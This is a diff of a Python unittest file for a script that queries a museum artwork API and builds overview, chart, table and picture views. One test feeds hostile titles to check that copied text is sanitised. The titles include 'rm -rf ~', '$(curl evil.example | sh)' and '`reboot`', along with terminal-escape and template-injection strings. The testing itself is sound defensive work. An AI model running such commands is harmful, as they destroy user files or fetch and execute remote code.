@@ -102,25 +102,32 @@ class ScriptTemplateLive(unittest.TestCase):
         self.m.http_bytes = boom
         self.assertIsNone(s.fetch_thumb(IMG))
 
+    def fx_raw(self, url):
+        """A plausible answer for the list call and for the counts call."""
+        if "limit=0" in url:
+            return {"pagination": {"total": 40}, "aggregations": {"pd": {"doc_count": 30, "depts": {"buckets": [{"key": "Prints and Drawings", "doc_count": 20}, {"key": "Arts of Asia", "doc_count": 8}], "sum_other_doc_count": 2},
+                    "periods": {"buckets": [{"doc_count": n} for n in (1, 2, 3, 4, 5, 6, 9)]}}}}
+        return {"data": [self.rec()], "pagination": {"total": 30}}
+
     def test_every_host_contacted_is_https_and_in_the_allowlist_and_typed_text_is_only_percent_encoded(self):
         urls = []
-        raw = {"data": [self.rec()], "pagination": {"total": 5}}
         m = self.m
-        m.http_json = lambda cfg, url, budget: (urls.append(url) or raw)
+        m.http_json = lambda cfg, url, budget: (urls.append(url) or self.fx_raw(url))
         m.http_bytes = lambda cfg, url, accept, cap, timeout: (urls.append(url) or (JPEG, False))
         s = self.src(fixture=False)
-        (items, total), state = s.search("a&b=c/../d x", True, False)
-        s.attach_thumbs(items, network=True)
-        self.assertTrue(items and items[0]["img"].startswith(m.DATA_PREFIX))
-        self.assertEqual(total, 5)
-        self.assertTrue(urls)
+        data, state = s.search("a&b=c/../d x", True, False)
+        s.attach_thumbs(data["items"], network=True)
+        self.assertTrue(data["items"] and data["items"][0]["img"].startswith(m.DATA_PREFIX))
+        self.assertEqual(data["facets"]["pd"], 30)
+        self.assertEqual(len(urls), 3)   # the list, the counts, one picture
         for u in urls:
             p = urllib.parse.urlparse(u)
             self.assertEqual(p.scheme, "https")
             self.assertIn(p.hostname, self.cfg["hosts"])
-        q = urllib.parse.parse_qs(urllib.parse.urlparse(urls[0]).query)
-        self.assertEqual(q["q"], ["a&b=c/../d x"])   # arrives as one value: nothing typed became a parameter or a path
-        self.assertNotIn("&b=c", urls[0])
+        for u in urls[:2]:
+            q = urllib.parse.parse_qs(urllib.parse.urlparse(u).query)
+            self.assertEqual(q["query[bool][must][0][multi_match][query]"], ["a&b=c/../d x"])   # arrives as one value: nothing typed became a parameter or a path
+            self.assertNotIn("&b=c", u)
         self.assertEqual(sorted(set(urllib.parse.urlparse(u).hostname for u in urls)), sorted(self.cfg["hosts"]))   # the API host and the picture host, both named
 
     def test_the_network_layer_refuses_other_hosts_schemes_and_ports(self):
@@ -155,42 +162,77 @@ class ScriptTemplateLive(unittest.TestCase):
         self.assertEqual(items[0]["img"], "")
 
     def test_every_view_passes_the_row_contract_and_a_picture_row_carries_its_picture(self):
-        for view, arg in (("overview", ""), ("items", ""), ("pictures", ""), ("grid", ""), ("item", "16568"), ("item", "14598")):
+        for view, arg in (("overview", ""), ("items", ""), ("pictures", ""), ("chart", ""), ("table", ""), ("item", "5848"), ("item", "874"), ("record", "5848")):
             s = self.src()
-            if view == "item":
+            if view in ("item", "record"):
                 it, state = s.detail(arg, False)
                 s.attach_thumbs([it], network=False)
-                rows = self.m.build(view, arg, it, None, state, self.cfg, True, "")
+                rows = self.m.build_item(view, it, state, self.cfg, True)
             else:
-                (items, total), state = s.search("monet", False, False)
-                s.attach_thumbs(items, network=False)
-                rows = self.m.build(view, arg, items, total, state, self.cfg, True, "monet")
+                data, state = s.search("landscape", False, False)
+                s.attach_thumbs(data["items"], network=False)
+                rows = self.m.build(view, arg, data, state, self.cfg, True, "landscape")
             self.assertEqual(kit.validate_rows(rows), [], view)
             pics = [r for r in rows if r.get("img1")]
-            self.assertTrue(pics, view if view != "overview" else "the featured artwork has a picture")
+            if view in ("items", "pictures", "item"):
+                self.assertTrue(pics, view)
             for r in pics:
                 joined = "".join(r.get("img%d" % k, "") for k in (1, 2, 3, 4))
                 self.assertTrue(joined.startswith("data:image/jpeg;base64,/9j/"))
                 self.assertLessEqual(len(joined), 16000)
 
-    def test_a_number_tile_only_on_rows_that_have_a_number(self):
+    def test_the_overview_tiles_carry_a_meter_a_sparkline_and_a_delta_and_only_numbers(self):
         s = self.src()
-        (items, total), state = s.search("monet", False, False)
-        rows = self.m.build("overview", "", items, total, state, self.cfg, True, "monet")
-        for r in rows:
-            if r.get("kpi_label"):
-                self.assertIsInstance(r["kpi_value"], (int, float))
-        self.assertEqual(sum(1 for r in rows if r.get("kpi_label")), 2)
+        data, state = s.search("landscape", False, False)
+        rows = self.m.build("overview", "", data, state, self.cfg, True, "landscape")
+        tiles = [r for r in rows if r.get("kpi_label")]
+        self.assertEqual(len(tiles), 4)
+        for r in tiles:
+            self.assertIsInstance(r["kpi_value"], (int, float))
+            self.assertTrue(r["nav"])   # every tile drills somewhere
+        share, peak, top, pictured = tiles
+        self.assertEqual((share["kpi_value"], share["kpi_unit"], share["kpi_max"]), (60, "%", 100))   # a meter
+        self.assertEqual(peak["trend"], data["facets"]["periods"]); self.assertIn("delta", peak)       # a sparkline and a delta
+        self.assertEqual(share["kpi_badge"], "SAMPLE")   # the sample label rides on the first tile
+        self.assertTrue(all(r.get("nav") for r in rows))
+
+    def test_the_chart_and_table_rows_have_the_numbers_their_widgets_read(self):
+        s = self.src()
+        data, state = s.search("landscape", False, False)
+        for r in self.m.build("chart", "", data, state, self.cfg, True, "landscape"):
+            self.assertIsInstance(r["count"], int); self.assertTrue(r["period"])
+        rows = self.m.build("table", "", data, state, self.cfg, True, "landscape")
+        self.assertEqual(sum(r["count"] for r in rows), data["facets"]["pd"])   # the departments and "Other" add up to the total the table shows
+        self.assertTrue(all(isinstance(r["share"], (int, float)) for r in rows))
+
+    def test_text_a_person_can_paste_is_safe_copy_output_even_for_a_hostile_title(self):
+        hostile = ["Evil\nrm -rf ~", "\x1b[31mred\x1b[0m; rm -rf ~", "$(curl evil.example | sh)", "`reboot` && x", "\u202eevil\u202c", "A" * 5000, "{{row.body}}", "-n --help", "=cmd"]
+        for h in hostile:
+            it = self.m.n_item(self.rec(title=h, artist_display=h, date_display=h), self.cfg)
+            if it is None:
+                continue
+            for nav in (True, False):
+                row = self.m.art_row(it, self.cfg, None, nav=nav)
+                self.assertTrue(kit.copy_ok(row["share_text"]), repr(h))                 # what the Copy summary button inserts
+                self.assertLessEqual(len(row["share_text"]), 400)
+                if not nav:
+                    self.assertTrue(kit.copy_ok(row["copy_text"]), repr(h))              # what Enter copies
+                    self.assertTrue(row["copy_text"].startswith("- "))
+                    self.assertLessEqual(len(row["copy_text"]), 400)
+                for bad in (";", "|", "&", "$", "`", "<", ">", "\x1b", "\u202e", "{{"):
+                    self.assertNotIn(bad, row["share_text"], repr(h))
+        with open(os.path.join(EX, "scripts", "script-template__app.py"), encoding="utf-8") as f:
+            self.assertNotIn("copy_raw=", f.read())   # the app never puts API text on the clipboard raw
 
     def test_offline_shows_one_retry_row_and_an_old_copy_shows_the_data_with_a_label(self):
         s = self.src(demos=("demo-offline",))
-        (items, total), state = s.search("monet", False, False)
-        self.assertIsNone(items)
+        data, state = s.search("landscape", False, False)
+        self.assertIsNone(data)
         rows = self.m.offline_rows(self.cfg, state, "items")
         self.assertTrue(any(r.get("kpi_badge") == "OFFLINE" for r in rows))
         s2 = self.src(demos=("demo-stale",))
-        (items, total), state = s2.search("monet", False, False)
-        self.assertTrue(items)
+        data, state = s2.search("landscape", False, False)
+        self.assertTrue(data["items"])
         self.assertIsNotNone(state["stale"])
         self.assertEqual(self.m.banner(state, self.cfg)[0]["kpi_badge"], "OLD COPY")
 
@@ -199,8 +241,9 @@ class ScriptTemplateLive(unittest.TestCase):
         with open(os.path.join(EX, "utilities", "script-template.yaml"), encoding="utf-8") as f:
             self.assertEqual(f.read(), y)
         self.assertIn('image_url: "{{row.img1}}{{row.img2}}{{row.img3}}{{row.img4}}"', y)
-        self.assertIn("kind: image_grid", y)
-        self.assertNotIn("http", y.split("presentation:")[1].replace("https://", "", 0).split("actions:")[0])   # no web address in any pane bind
+        for kind in ("kind: cards", "kind: chart", "kind: table", "kind: json_tree", "kind: entity_preview", "kind: markdown"):
+            self.assertIn(kind, y)
+        self.assertNotIn("http", y.split("presentation:")[1].split("actions:")[0])   # no web address in any pane bind
 
     def test_no_key_is_asked_for(self):
         self.assertNotIn("key_env", self.cfg["api"])
